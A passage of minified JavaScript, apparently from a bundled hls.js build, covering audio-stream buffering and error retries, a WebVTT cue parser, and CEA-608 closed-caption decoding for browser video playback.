"+this.startPosition)):this.startPosition=0}this.nextLoadPosition=this.startPosition}this.state===K_WAITING_TRACK&&(this.state=K_IDLE),this.tick()},t.onKeyLoaded=function e(){this.state===K_KEY_LOADING&&(this.state=K_IDLE,this.tick())},t.onFragLoaded=function e(t){var r=this.fragCurrent,n=t.frag;if(this.state===K_FRAG_LOADING&&r&&"audio"===n.type&&n.level===r.level&&n.sn===r.sn){var i=this.tracks[this.trackId],a=i.details,s=a.totalduration,o=r.level,l=r.sn,u=r.cc,c=this.config.defaultAudioCodec||i.audioCodec||"mp4a.40.2",d=this.stats=t.stats;if("initSegment"===l)this.state=K_IDLE,d.tparsed=d.tbuffered=Y.now(),a.initSegment.data=t.payload,this.hls.trigger(M.default.FRAG_BUFFERED,{stats:d,frag:r,id:"audio"}),this.tick();else{this.state=K_PARSING,this.appended=!1,this.demuxer||(this.demuxer=new v(this.hls,"audio"));var f=this.initPTS[u],h=a.initSegment?a.initSegment.data:[];if(void 0!==f){this.pendingBuffering=!0,F.logger.log("Demuxing "+l+" of ["+a.startSN+" ,"+a.endSN+"],track "+o);this.demuxer.push(t.payload,h,c,null,r,s,!1,f)}else F.logger.log("Unknown video PTS for cc "+u+", waiting for video PTS before demuxing audio frag "+l+" of ["+a.startSN+" ,"+a.endSN+"],track "+o),this.waitingFragment=t,this.waitingVideoCC=this.videoTrackCC,this.state=K_WAITING_INIT_PTS}}this.fragLoadError=0},t.onFragParsingInitSegment=function e(t){var r=this.fragCurrent,n=t.frag;if(r&&"audio"===t.id&&n.sn===r.sn&&n.level===r.level&&this.state===K_PARSING){var a,i=t.tracks;if(i.video&&delete i.video,a=i.audio){a.levelCodec=a.codec,a.id=t.id,this.hls.trigger(M.default.BUFFER_CODECS,i),F.logger.log("audio track:audio,container:"+a.container+",codecs[level/parsed]=["+a.levelCodec+"/"+a.codec+"]");var s=a.initSegment;if(s){var o={type:"audio",data:s,parent:"audio",content:"initSegment"};this.audioSwitch?this.pendingData=[o]:(this.appended=!0,this.pendingBuffering=!0,this.hls.trigger(M.default.BUFFER_APPENDING,o))}this.tick()}}},t.onFragParsingData=function e(t){var r=this,n=this.fragCurrent,i=t.frag;if(n&&"audio"===t.id&&"audio"===t.type&&i.sn===n.sn&&i.level===n.level&&this.state===K_PARSING){var a=this.trackId,s=this.tracks[a],o=this.hls;Object(x.isFiniteNumber)(t.endPTS)||(t.endPTS=t.startPTS+n.duration,t.endDTS=t.startDTS+n.duration),n.addElementaryStream(f.AUDIO),F.logger.log("parsed "+t.type+",PTS:["+t.startPTS.toFixed(3)+","+t.endPTS.toFixed(3)+"],DTS:["+t.startDTS.toFixed(3)+"/"+t.endDTS.toFixed(3)+"],nb:"+t.nb),Ie(s.details,n,t.startPTS,t.endPTS);var l=this.media,u=!1;if(this.audioSwitch)if(l&&l.readyState){var c=l.currentTime;F.logger.log("switching audio track : currentTime:"+c),c>=t.startPTS&&(F.logger.log("switching audio track : flushing all audio"),this.state=K_BUFFER_FLUSHING,o.trigger(M.default.BUFFER_FLUSHING,{startOffset:0,endOffset:Number.POSITIVE_INFINITY,type:"audio"}),u=!0,this.audioSwitch=!1,o.trigger(M.default.AUDIO_TRACK_SWITCHED,{id:a}))}else this.audioSwitch=!1,o.trigger(M.default.AUDIO_TRACK_SWITCHED,{id:a});var d=this.pendingData;if(!d)return F.logger.warn("Apparently attempt to enqueue media payload without codec initialization data upfront"),void o.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:null,fatal:!0});this.audioSwitch||([t.data1,t.data2].forEach((function(e){e&&e.length&&d.push({type:t.type,data:e,parent:"audio",content:"data"})})),!u&&d.length&&(d.forEach((function(e){r.state===K_PARSING&&(r.pendingBuffering=!0,r.hls.trigger(M.default.BUFFER_APPENDING,e))})),this.pendingData=[],this.appended=!0)),this.tick()}},t.onFragParsed=function e(t){var r=this.fragCurrent,n=t.frag;r&&"audio"===t.id&&n.sn===r.sn&&n.level===r.level&&this.state===K_PARSING&&(this.stats.tparsed=Y.now(),this.state=K_PARSED,this._checkAppendedParsed())},t.onBufferReset=function e(){this.mediaBuffer=this.videoBuffer=null,this.loadedmetadata=!1},t.onBufferCreated=function e(t){var r=t.tracks.audio;r&&(this.mediaBuffer=r.buffer,this.loadedmetadata=!0),t.tracks.video&&(this.videoBuffer=t.tracks.video.buffer)},t.onBufferAppended=function e(t){if("audio"===t.parent){var r=this.state;r!==K_PARSING&&r!==K_PARSED||(this.pendingBuffering=t.pending>0,this._checkAppendedParsed())}},t._checkAppendedParsed=function e(){if(!(this.state!==K_PARSED||this.appended&&this.pendingBuffering)){var t=this.fragCurrent,r=this.stats,n=this.hls;if(t){this.fragPrevious=t,r.tbuffered=Y.now(),n.trigger(M.default.FRAG_BUFFERED,{stats:r,frag:t,id:"audio"});var i=this.mediaBuffer?this.mediaBuffer:this.media;i&&F.logger.log("audio buffered : "+Be.toString(i.buffered)),this.audioSwitch&&this.appended&&(this.audioSwitch=!1,n.trigger(M.default.AUDIO_TRACK_SWITCHED,{id:this.trackId})),this.state=K_IDLE}this.tick()}},t.onError=function e(t){var r=t.frag;if(!r||"audio"===r.type)switch(t.details){case A.ErrorDetails.FRAG_LOAD_ERROR:case A.ErrorDetails.FRAG_LOAD_TIMEOUT:var n=t.frag;if(n&&"audio"!==n.type)break;if(!t.fatal){var i=this.fragLoadError;i?i++:i=1;var a=this.config;if(i<=a.fragLoadingMaxRetry){this.fragLoadError=i;var s=Math.min(Math.pow(2,i-1)*a.fragLoadingRetryDelay,a.fragLoadingMaxRetryTimeout);F.logger.warn("AudioStreamController: frag loading failed, retry in "+s+" ms"),this.retryDate=Y.now()+s,this.state=K_FRAG_LOADING_WAITING_RETRY}else F.logger.error("AudioStreamController: "+t.details+" reaches max retry, redispatch as fatal ..."),t.fatal=!0,this.state=K_ERROR}break;case A.ErrorDetails.AUDIO_TRACK_LOAD_ERROR:case A.ErrorDetails.AUDIO_TRACK_LOAD_TIMEOUT:case A.ErrorDetails.KEY_LOAD_ERROR:case A.ErrorDetails.KEY_LOAD_TIMEOUT:this.state!==K_ERROR&&(this.state=t.fatal?K_ERROR:K_IDLE,F.logger.warn("AudioStreamController: "+t.details+" while loading frag, now switching to "+this.state+" state ..."));break;case A.ErrorDetails.BUFFER_FULL_ERROR:if("audio"===t.parent&&(this.state===K_PARSING||this.state===K_PARSED)){var o=this.mediaBuffer,l=this.media.currentTime;if(o&&j.isBuffered(o,l)&&j.isBuffered(o,l+.5)){var c=this.config;c.maxMaxBufferLength>=c.maxBufferLength&&(c.maxMaxBufferLength/=2,F.logger.warn("AudioStreamController: reduce max buffer length to "+c.maxMaxBufferLength+"s")),this.state=K_IDLE}else F.logger.warn("AudioStreamController: buffer full error also media.currentTime is not buffered, flush audio buffer"),this.fragCurrent=null,this.state=K_BUFFER_FLUSHING,this.hls.trigger(M.default.BUFFER_FLUSHING,{startOffset:0,endOffset:Number.POSITIVE_INFINITY,type:"audio"})}}},t.onBufferFlushed=function e(){var t=this,r=this.pendingData;r&&r.length?(F.logger.log("AudioStreamController: appending pending audio data after buffer flushed"),r.forEach((function(e){t.hls.trigger(M.default.BUFFER_APPENDING,e)})),this.appended=!0,this.pendingData=[],this.state=K_PARSED):(this.state=K_IDLE,this.fragPrevious=null,this.tick())},function ir(e,t,r){return t&&nr(e.prototype,t),r&&nr(e,r),e}(e,[{key:"state",set:function e(t){if(this.state!==t){var r=this.state;this._state=t,F.logger.log("audio stream:"+r+"->"+t)}},get:function e(){return this._state}}]),e}(it),ur=lr,cr=function(){if("undefined"!=typeof window&&window.VTTCue)return window.VTTCue;var r={"":!0,lr:!0,rl:!0},n={start:!0,middle:!0,end:!0,left:!0,right:!0};function E(e){return"string"==typeof e&&(!!r[e.toLowerCase()]&&e.toLowerCase())}function b(e){return"string"==typeof e&&(!!n[e.toLowerCase()]&&e.toLowerCase())}function k(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var n in r)e[n]=r[n]}return e}function e(e,t,r){var n=this,i={enumerable:!0};n.hasBeenReset=!1;var a="",s=!1,o=e,l=t,u=r,c=null,d="",f=!0,h="auto",p="start",v=50,g="middle",A=50,m="middle";Object.defineProperty(n,"id",k({},i,{get:function e(){return a},set:function e(t){a=""+t}})),Object.defineProperty(n,"pauseOnExit",k({},i,{get:function e(){return s},set:function e(t){s=!!t}})),Object.defineProperty(n,"startTime",k({},i,{get:function e(){return o},set:function e(t){if("number"!=typeof t)throw new TypeError("Start time must be set to a number.");o=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"endTime",k({},i,{get:function e(){return l},set:function e(t){if("number"!=typeof t)throw new TypeError("End time must be set to a number.");l=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"text",k({},i,{get:function e(){return u},set:function e(t){u=""+t,this.hasBeenReset=!0}})),Object.defineProperty(n,"region",k({},i,{get:function e(){return c},set:function e(t){c=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"vertical",k({},i,{get:function e(){return d},set:function e(t){var r=E(t);if(!1===r)throw new SyntaxError("An invalid or illegal string was specified.");d=r,this.hasBeenReset=!0}})),Object.defineProperty(n,"snapToLines",k({},i,{get:function e(){return f},set:function e(t){f=!!t,this.hasBeenReset=!0}})),Object.defineProperty(n,"line",k({},i,{get:function e(){return h},set:function e(t){if("number"!=typeof t&&"auto"!==t)throw new SyntaxError("An invalid number or illegal string was specified.");h=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"lineAlign",k({},i,{get:function e(){return p},set:function e(t){var r=b(t);if(!r)throw new SyntaxError("An invalid or illegal string was specified.");p=r,this.hasBeenReset=!0}})),Object.defineProperty(n,"position",k({},i,{get:function e(){return v},set:function e(t){if(t<0||t>100)throw new Error("Position must be between 0 and 100.");v=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"positionAlign",k({},i,{get:function e(){return g},set:function e(t){var r=b(t);if(!r)throw new SyntaxError("An invalid or illegal string was specified.");g=r,this.hasBeenReset=!0}})),Object.defineProperty(n,"size",k({},i,{get:function e(){return A},set:function e(t){if(t<0||t>100)throw new Error("Size must be between 0 and 100.");A=t,this.hasBeenReset=!0}})),Object.defineProperty(n,"align",k({},i,{get:function e(){return m},set:function e(t){var r=b(t);if(!r)throw new SyntaxError("An invalid or illegal string was specified.");m=r,this.hasBeenReset=!0}})),n.displayState=void 0}return e.prototype.getCueAsHTML=function(){return window.WebVTT.convertCueToDOMTree(window,this.text)},e}(),dr=function e(){return{decode:function e(t){if(!t)return"";if("string"!=typeof t)throw new Error("Error - expected string data.");return decodeURIComponent(encodeURIComponent(t))}}};function fr(){this.window=window,this.state="INITIAL",this.buffer="",this.decoder=new dr,this.regionList=[]}function pr(){this.values=Object.create(null)}function vr(e,t,r,n){var i=n?e.split(n):[e];for(var a in i)if("string"==typeof i[a]){var s=i[a].split(r);if(2===s.length)t(s[0],s[1])}}pr.prototype={set:function e(t,r){this.get(t)||""===r||(this.values[t]=r)},get:function e(t,r,n){return n?this.has(t)?this.values[t]:r[n]:this.has(t)?this.values[t]:r},has:function e(t){return t in this.values},alt:function e(t,r,n){for(var i=0;i<n.length;++i)if(r===n[i]){this.set(t,r);break}},integer:function e(t,r){/^-?\d+$/.test(r)&&this.set(t,parseInt(r,10))},percent:function e(t,r){return!!(r.match(/^([\d]{1,3})(\.[\d]*)?%$/)&&(r=parseFloat(r))>=0&&r<=100)&&(this.set(t,r),!0)}};var gr=new cr(0,0,0),o="middle"===gr.align?"middle":"center";function Ar(t,e,s){var r=t;function n(){var e=function hr(e){function t(e,t,r,n){return 3600*(0|e)+60*(0|t)+(0|r)+(0|n)/1e3}var r=e.match(/^(\d+):(\d{2})(:\d{2})?\.(\d{3})/);return r?r[3]?t(r[1],r[2],r[3].replace(":",""),r[4]):r[1]>59?t(r[1],r[2],0,r[4]):t(0,r[1],r[2],r[4]):null}(t);if(null===e)throw new Error("Malformed timestamp: "+r);return t=t.replace(/^[^\sa-zA-Z-]+/,""),e}function a(){t=t.replace(/^\s+/,"")}if(a(),e.startTime=n(),a(),"--\x3e"!==t.substr(0,3))throw new Error("Malformed time stamp (time stamps must be separated by '--\x3e'): "+r);t=t.substr(3),a(),e.endTime=n(),a(),function i(e,t){var a=new pr;vr(e,(function(e,t){switch(e){case"region":for(var r=s.length-1;r>=0;r--)if(s[r].id===t){a.set(e,s[r].region);break}break;case"vertical":a.alt(e,t,["rl","lr"]);break;case"line":var n=t.split(","),i=n[0];a.integer(e,i),a.percent(e,i)&&a.set("snapToLines",!1),a.alt(e,i,["auto"]),2===n.length&&a.alt("lineAlign",n[1],["start",o,"end"]);break;case"position":n=t.split(","),a.percent(e,n[0]),2===n.length&&a.alt("positionAlign",n[1],["start",o,"end","line-left","line-right","auto"]);break;case"size":a.percent(e,t);break;case"align":a.alt(e,t,["start",o,"end","left","right"])}}),/:/,/\s/),t.region=a.get("region",null),t.vertical=a.get("vertical","");var r=a.get("line","auto");"auto"===r&&-1===gr.line&&(r=-1),t.line=r,t.lineAlign=a.get("lineAlign","start"),t.snapToLines=a.get("snapToLines",!0),t.size=a.get("size",100),t.align=a.get("align",o);var n=a.get("position","auto");"auto"===n&&50===gr.position&&(n="start"===t.align||"left"===t.align?0:"end"===t.align||"right"===t.align?100:50),t.position=n}(t,e)}function mr(e){return e.replace(/<br(?: \/)?>/gi,"\n")}fr.prototype={parse:function e(t){var n=this;function r(){var e=n.buffer,t=0;for(e=mr(e);t<e.length&&"\r"!==e[t]&&"\n"!==e[t];)++t;var r=e.substr(0,t);return"\r"===e[t]&&++t,"\n"===e[t]&&++t,n.buffer=e.substr(t),r}function i(e){vr(e,(function(e,t){}),/:/)}t&&(n.buffer+=n.decoder.decode(t,{stream:!0}));try{var a;if("INITIAL"===n.state){if(!/\r\n|\n/.test(n.buffer))return this;var s=(a=r()).match(/^(ï»¿)?WEBVTT([ \t].*)?$/);if(!s||!s[0])throw new Error("Malformed WebVTT signature.");n.state="HEADER"}for(var o=!1;n.buffer;){if(!/\r\n|\n/.test(n.buffer))return this;switch(o?o=!1:a=r(),n.state){case"HEADER":/:/.test(a)?i(a):a||(n.state="ID");continue;case"NOTE":a||(n.state="ID");continue;case"ID":if(/^NOTE($|[ \t])/.test(a)){n.state="NOTE";break}if(!a)continue;if(n.cue=new cr(0,0,""),n.state="CUE",-1===a.indexOf("--\x3e")){n.cue.id=a;continue}case"CUE":try{Ar(a,n.cue,n.regionList)}catch(e){n.cue=null,n.state="BADCUE";continue}n.state="CUETEXT";continue;case"CUETEXT":var l=-1!==a.indexOf("--\x3e");if(!a||l&&(o=!0)){n.oncue&&n.oncue(n.cue),n.cue=null,n.state="ID";continue}n.cue.text&&(n.cue.text+="\n"),n.cue.text+=a;continue;case"BADCUE":a||(n.state="ID");continue}}}catch(e){"CUETEXT"===n.state&&n.cue&&n.oncue&&n.oncue(n.cue),n.cue=null,n.state="INITIAL"===n.state?"BADWEBVTT":"BADCUE"}return this},flush:function e(){var t=this;try{if(t.buffer+=t.decoder.decode(),(t.cue||"HEADER"===t.state)&&(t.buffer+="\n\n",t.parse()),"INITIAL"===t.state)throw new Error("Malformed WebVTT signature.")}catch(e){throw e}return t.onflush&&t.onflush(),this}};var yr=fr;function Er(e,t,r,n){for(var a,s,o,l,u,i=[],c=window.VTTCue||TextTrackCue,d=0;d<n.rows.length;d++)if(o=!0,l=0,u="",!(a=n.rows[d]).isEmpty()){for(var f=0;f<a.chars.length;f++)a.chars[f].uchar.match(/\s/)&&o?l++:(u+=a.chars[f].uchar,o=!1);a.cueStartTime=t,t===r&&(r+=1e-4),s=new c(t,r,mr(u.trim())),l>=16?l--:l++,navigator.userAgent.match(/Firefox\//)?s.line=d+1:s.line=d>7?d-2:d+1,s.align="left",s.position=Math.max(0,Math.min(100,l/32*100)),i.push(s),e&&e.addCue(s)}return i}var p,br={42:225,92:233,94:237,95:243,96:250,123:231,124:247,125:209,126:241,127:9608,128:174,129:176,130:189,131:191,132:8482,133:162,134:163,135:9834,136:224,137:32,138:232,139:226,140:234,141:238,142:244,143:251,144:193,145:201,146:211,147:218,148:220,149:252,150:8216,151:161,152:42,153:8217,154:9473,155:169,156:8480,157:8226,158:8220,159:8221,160:192,161:194,162:199,163:200,164:202,165:203,166:235,167:206,168:207,169:239,170:212,171:217,172:249,173:219,174:171,175:187,176:195,177:227,178:205,179:204,180:236,181:210,182:242,183:213,184:245,185:123,186:125,187:92,188:94,189:95,190:124,191:8764,192:196,193:228,194:214,195:246,196:223,197:165,198:164,199:9475,200:197,201:229,202:216,203:248,204:9487,205:9491,206:9495,207:9499},kr=function e(t){var r=t;return br.hasOwnProperty(t)&&(r=br[t]),String.fromCharCode(r)},h=15,l=100,_r={17:1,18:3,21:5,22:7,23:9,16:11,19:12,20:14},Tr={17:2,18:4,21:6,22:8,23:10,19:13,20:15},Sr={25:1,26:3,29:5,30:7,31:9,24:11,27:12,28:14},Cr={25:2,26:4,29:6,30:8,31:10,27:13,28:15},Rr=["white","green","blue","cyan","red","yellow","magenta","black","transparent"];!function(e){e[e.ERROR=0]="ERROR",e[e.TEXT=1]="TEXT",e[e.WARNING=2]="WARNING",e[e.INFO=2]="INFO",e[e.DEBUG=3]="DEBUG",e[e.DATA=3]="DATA"}(p||(p={}));var wr=function(){function e(){this.time=null,this.verboseLevel=p.ERROR}return e.prototype.log=function e(t,r){this.verboseLevel>=t&&F.logger.log(this.time+" ["+t+"] "+r)},e}(),g=function e(t){for(var r=[],n=0;n<t.length;n++)r.push(t[n].toString(16));return r},Or=function(){function e(e,t,r,n,i){this.foreground=void 0,this.underline=void 0,this.italics=void 0,this.background=void 0,this.flash=void 0,this.foreground=e||"white",this.underline=t||!1,this.italics=r||!1,this.background=n||"black",this.flash=i||!1}var t=e.prototype;return t.reset=function e(){this.foreground="white",this.underline=!1,this.italics=!1,this.background="black",this.flash=!1},t.setStyles=function e(t){for(var r=["foreground","underline","italics","background","flash"],n=0;n<r.length;n++){var i=r[n];t.hasOwnProperty(i)&&(this[i]=t[i])}},t.isDefault=function e(){return"white"===this.foreground&&!this.underline&&!this.italics&&"black"===this.background&&!this.flash},t.equals=function e(t){return this.foreground===t.foreground&&this.underline===t.underline&&this.italics===t.italics&&this.background===t.background&&this.flash===t.flash},t.copy=function e(t){this.foreground=t.foreground,this.underline=t.underline,this.italics=t.italics,this.background=t.background,this.flash=t.flash},t.toString=function e(){return"color="+this.foreground+", underline="+this.underline+", italics="+this.italics+", background="+this.background+", flash="+this.flash},e}(),Lr=function(){function e(e,t,r,n,i,a){this.uchar=void 0,this.penState=void 0,this.uchar=e||" ",this.penState=new Or(t,r,n,i,a)}var t=e.prototype;return t.reset=function e(){this.uchar=" ",this.penState.reset()},t.setChar=function e(t,r){this.uchar=t,this.penState.copy(r)},t.setPenState=function e(t){this.penState.copy(t)},t.equals=function e(t){return this.uchar===t.uchar&&this.penState.equals(t.penState)},t.copy=function e(t){this.uchar=t.uchar,this.penState.copy(t.penState)},t.isEmpty=function e(){return" "===this.uchar&&this.penState.isDefault()},e}(),Ir=function(){function e(e){this.chars=void 0,this.pos=void 0,this.currPenState=void 0,this.cueStartTime=void 0,this.logger=void 0,this.chars=[];for(var t=0;t<l;t++)this.chars.push(new Lr);this.logger=e,this.pos=0,this.currPenState=new Or}var t=e.prototype;return t.equals=function e(t){for(var r=!0,n=0;n<l;n++)if(!this.chars[n].equals(t.chars[n])){r=!1;break}return r},t.copy=function e(t){for(var r=0;r<l;r++)this.chars[r].copy(t.chars[r])},t.isEmpty=function e(){for(var t=!0,r=0;r<l;r++)if(!this.chars[r].isEmpty()){t=!1;break}return t},t.setCursor=function e(t){this.pos!==t&&(this.pos=t),this.pos<0?(this.logger.log(p.DEBUG,"Negative cursor position "+this.pos),this.pos=0):this.pos>l&&(this.logger.log(p.DEBUG,"Too large cursor position "+this.pos),this.pos=l)},t.moveCursor=function e(t){var r=this.pos+t;if(t>1)for(var n=this.pos+1;n<r+1;n++)this.chars[n].setPenState(this.currPenState);this.setCursor(r)},t.backSpace=function e(){this.moveCursor(-1),this.chars[this.pos].setChar(" ",this.currPenState)},t.insertChar=function e(t){t>=144&&this.backSpace();var r=kr(t);this.pos>=l?this.logger.log(p.ERROR,"Cannot insert "+t.toString(16)+" ("+r+") at position "+this.pos+". Skipping it!"):(this.chars[this.pos].setChar(r,this.currPenState),this.moveCursor(1))},t.clearFromPos=function e(t){var r;for(r=t;r<l;r++)this.chars[r].reset()},t.clear=function e(){this.clearFromPos(0),this.pos=0,this.currPenState.reset()},t.clearToEndOfRow=function e(){this.clearFromPos(this.pos)},t.getTextString=function e(){for(var t=[],r=!0,n=0;n<l;n++){var i=this.chars[n].uchar;" "!==i&&(r=!1),t.push(i)}return r?"":t.join("")},t.setPenStyles=function e(t){this.currPenState.setStyles(t),this.chars[this.pos].setPenState(this.currPenState)},e}(),Dr=function(){function e(e){this.rows=void 0,this.currRow=void 0,this.nrRollUpRows=void 0,this.lastOutputScreen=void 0,this.logger=void 0,this.rows=[];for(var t=0;t<h;t++)this.rows.push(new Ir(e));this.logger=e,this.currRow=14,this.nrRollUpRows=null,this.lastOutputScreen=null,this.reset()}var t=e.prototype;return t.reset=function e(){for(var t=0;t<h;t++)this.rows[t].clear();this.currRow=14},t.equals=function e(t){for(var r=!0,n=0;n<h;n++)if(!this.rows[n].equals(t.rows[n])){r=!1;break}return r},t.copy=function e(t){for(var r=0;r<h;r++)this.rows[r].copy(t.rows[r])},t.isEmpty=function e(){for(var t=!0,r=0;r<h;r++)if(!this.rows[r].isEmpty()){t=!1;break}return t},t.backSpace=function e(){this.rows[this.currRow].backSpace()},t.clearToEndOfRow=function e(){this.rows[this.currRow].clearToEndOfRow()},t.insertChar=function e(t){this.rows[this.currRow].insertChar(t)},t.setPen=function e(t){this.rows[this.currRow].setPenStyles(t)},t.moveCursor=function e(t){this.rows[this.currRow].moveCursor(t)},t.setCursor=function e(t){this.logger.log(p.INFO,"setCursor: "+t),this.rows[this.currRow].setCursor(t)},t.setPAC=function e(t){this.logger.log(p.INFO,"pacData = "+JSON.stringify(t));var r=t.row-1;if(this.nrRollUpRows&&r<this.nrRollUpRows-1&&(r=this.nrRollUpRows-1),this.nrRollUpRows&&this.currRow!==r){for(var n=0;n<h;n++)this.rows[n].clear();var i=this.currRow+1-this.nrRollUpRows,a=this.lastOutputScreen;if(a){var s=a.rows[i].cueStartTime,o=this.logger.time;if(s&&null!==o&&s<o)for(var l=0;l<this.nrRollUpRows;l++)this.rows[r-this.nrRollUpRows+l+1].copy(a.rows[i+l])}}this.currRow=r;var u=this.rows[this.currRow];if(null!==t.indent){var c=t.indent,d=Math.max(c-1,0);u.setCursor(t.indent),t.color=u.chars[d].penState.foreground}var f={foreground:t.color,underline:t.underline,italics:t.italics,background:"black",flash:!1};this.setPen(f)},t.setBkgData=function e(t){this.logger.log(p.INFO,"bkgData = "+JSON.stringify(t)),this.backSpace(),this.setPen(t),this.insertChar(32)},t.setRollUpRows=function e(t){this.nrRollUpRows=t},t.rollUp=function e(){if(null!==this.nrRollUpRows){this.logger.log(p.TEXT,this.getDisplayText());var t=this.currRow+1-this.nrRollUpRows,r=this.rows.splice(t,1)[0];r.clear(),this.rows.splice(this.currRow,0,r),this.logger.log(p.INFO,"Rolling up")}else this.logger.log(p.DEBUG,"roll_up but nrRollUpRows not set yet")},t.getDisplayText=function e(t){t=t||!1;for(var r=[],n="",i=-1,a=0;a<h;a++){var s=this.rows[a].getTextString();s&&(i=a+1,t?r.push("Row "+i+": '"+s+"'"):r.push(s.trim()))}return r.length>0&&(n=t?"["+r.join(" | ")+"]":r.join("\n")),n},t.getTextAndFormat=function e(){return this.rows},e}(),Pr=function(){function e(e,t,r){this.chNr=void 0,this.outputFilter=void 0,this.mode=void 0,this.verbose=void 0,this.displayedMemory=void 0,this.nonDisplayedMemory=void 0,this.lastOutputScreen=void 0,this.currRollUpRow=void 0,this.writeScreen=void 0,this.cueStartTime=void 0,this.logger=void 0,this.chNr=e,this.outputFilter=t,this.mode=null,this.verbose=0,this.displayedMemory=new Dr(r),this.nonDisplayedMemory=new Dr(r),this.lastOutputScreen=new Dr(r),this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.mode=null,this.cueStartTime=null,this.logger=r}var t=e.prototype;return t.reset=function e(){this.mode=null,this.displayedMemory.reset(),this.nonDisplayedMemory.reset(),this.lastOutputScreen.reset(),this.outputFilter.reset(),this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.mode=null,this.cueStartTime=null},t.getHandler=function e(){return this.outputFilter},t.setHandler=function e(t){this.outputFilter=t},t.setPAC=function e(t){this.writeScreen.setPAC(t)},t.setBkgData=function e(t){this.writeScreen.setBkgData(t)},t.setMode=function e(t){t!==this.mode&&(this.mode=t,this.logger.log(p.INFO,"MODE="+t),"MODE_POP-ON"===this.mode?this.writeScreen=this.nonDisplayedMemory:(this.writeScreen=this.displayedMemory,this.writeScreen.reset()),"MODE_ROLL-UP"!==this.mode&&(this.displayedMemory.nrRollUpRows=null,this.nonDisplayedMemory.nrRollUpRows=null),this.mode=t)},t.insertChars=function e(t){for(var r=0;r<t.length;r++)this.writeScreen.insertChar(t[r]);var n=this.writeScreen===this.displayedMemory?"DISP":"NON_DISP";this.logger.log(p.INFO,n+": "+this.writeScreen.getDisplayText(!0)),"MODE_PAINT-ON"!==this.mode&&"MODE_ROLL-UP"!==this.mode||(this.logger.log(p.TEXT,"DISPLAYED: "+this.displayedMemory.getDisplayText(!0)),this.outputDataUpdate())},t.ccRCL=function e(){this.logger.log(p.INFO,"RCL - Resume Caption Loading"),this.setMode("MODE_POP-ON")},t.ccBS=function e(){this.logger.log(p.INFO,"BS - BackSpace"),"MODE_TEXT"!==this.mode&&(this.writeScreen.backSpace(),this.writeScreen===this.displayedMemory&&this.outputDataUpdate())},t.ccAOF=function e(){},t.ccAON=function e(){},t.ccDER=function e(){this.logger.log(p.INFO,"DER- Delete to End of Row"),this.writeScreen.clearToEndOfRow(),this.outputDataUpdate()},t.ccRU=function e(t){this.logger.log(p.INFO,"RU("+t+") - Roll Up"),this.writeScreen=this.displayedMemory,this.setMode("MODE_ROLL-UP"),this.writeScreen.setRollUpRows(t)},t.ccFON=function e(){this.logger.log(p.INFO,"FON - Flash On"),this.writeScreen.setPen({flash:!0})},t.ccRDC=function e(){this.logger.log(p.INFO,"RDC - Resume Direct Captioning"),this.setMode("MODE_PAINT-ON")},t.ccTR=function e(){this.logger.log(p.INFO,"TR"),this.setMode("MODE_TEXT")},t.ccRTD=function e(){this.logger.log(p.INFO,"RTD"),this.setMode("MODE_TEXT")},t.ccEDM=function e(){this.logger.log(p.INFO,"EDM - Erase Displayed Memory"),this.displayedMemory.reset(),this.outputDataUpdate(!0)},t.ccCR=function e(){this.logger.log(p.INFO,"CR - Carriage Return"),this.writeScreen.rollUp(),this.outputDataUpdate(!0)},t.ccENM=function e(){this.logger.log(p.INFO,"ENM - Erase Non-displayed Memory"),this.nonDisplayedMemory.reset()},t.ccEOC=function e(){if(this.logger.log(p.INFO,"EOC - End Of Caption"),"MODE_POP-ON"===this.mode){var t=this.displayedMemory;this.displayedMemory=this.nonDisplayedMemory,this.nonDisplayedMemory=t,this.writeScreen=this.nonDisplayedMemory,this.logger.log(p.TEXT,"DISP: "+this.displayedMemory.getDisplayText())}this.outputDataUpdate(!0)},t.ccTO=function e(t){this.logger.log(p.INFO,"TO("+t+") - Tab Offset"),this.writeScreen.moveCursor(t)},t.ccMIDROW=function e(t){var r={flash:!1};if(r.underline=t%2==1,r.italics=t>=46,r.italics)r.foreground="white";else{var n=Math.floor(t/2)-16;r.foreground=["white","green","blue","cyan","red","yellow","magenta"][n]}this.logger.log(p.INFO,"MIDROW: "+JSON.stringify(r)),this.writeScreen.setPen(r)},t.outputDataUpdate=function e(t){void 0===t&&(t=!1);var r=this.logger.time;null!==r&&this.outputFilter&&(null!==this.cueStartTime||this.displayedMemory.isEmpty()?this.displayedMemory.equals(this.lastOutputScreen)||(this.outputFilter.newCue(this.cueStartTime,r,this.lastOutputScreen),t&&this.outputFilter.dispatchCue&&this.outputFilter.dispatchCue(),this.cueStartTime=this.displayedMemory.isEmpty()?null:r):this.cueStartTime=r,this.lastOutputScreen.copy(this.displayedMemory))},t.cueSplitAtTime=function e(t){this.outputFilter&&(this.displayedMemory.isEmpty()||(this.outputFilter.newCue&&this.outputFilter.newCue(this.cueStartTime,t,this.displayedMemory),this.cueStartTime=t))},e}(),Nr=function(){function e(e,t,r){this.channels=void 0,this.currentChannel=0,this.cmdHistory=void 0,this.logger=void 0;var n=new wr;this.channels=[null,new Pr(e,t,n),new Pr(e+1,r,n)],this.cmdHistory={a:null,b:null},this.logger=n}var t=e.prototype;return t.getHandler=function e(t){return this.channels[t].getHandler()},t.setHandler=function e(t,r){this.channels[t].setHandler(r)},t.addData=function e(t,r){var n,i,a,s=!1;this.logger.time=t;for(var o=0;o<r.length;o+=2)if(i=127&r[o],a=127&r[o+1],0!==i||0!==a){if(this.logger.log(p.DATA,"["+g([r[o],r[o+1]])+"] -> ("+g([i,a])+")"),(n=this.parseCmd(i,a))||(n=this.parseMidrow(i,a)),n||(n=this.parsePAC(i,a)),n||(n=this.parseBackgroundAttributes(i,a)),!n&&(s=this.parseChars(i,a))){var l=this.currentChannel;if(l&&l>0)this.channels[l].insertChars(s);else this.logger.log(p.WARNING,"No channel found yet. TEXT-MODE?")}n||s||this.logger.log(p.WARNING,"Couldn't parse cleaned data "+g([i,a])+" orig: "+g([r[o],r[o+1]]))}},t.parseCmd=function e(t,r){var 